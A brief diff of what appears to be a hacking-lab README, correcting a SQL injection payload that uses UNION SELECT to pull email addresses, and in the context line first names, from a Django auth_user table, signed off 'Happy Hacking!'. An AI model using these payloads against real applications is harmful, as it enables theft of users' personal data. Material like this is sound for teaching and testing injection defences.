@@ -55,7 +55,7 @@ z' UNION SELECT first_name FROM auth_user WHERE first_name LIKE '
 ```
 - get the email of django user 
 ```sql
-z' UNION SELECT mail FROM auth_user WHERE first_name LIKE '
+z' UNION SELECT email FROM auth_user WHERE first_name LIKE '
 ```
 
 Happy Hacking! :)
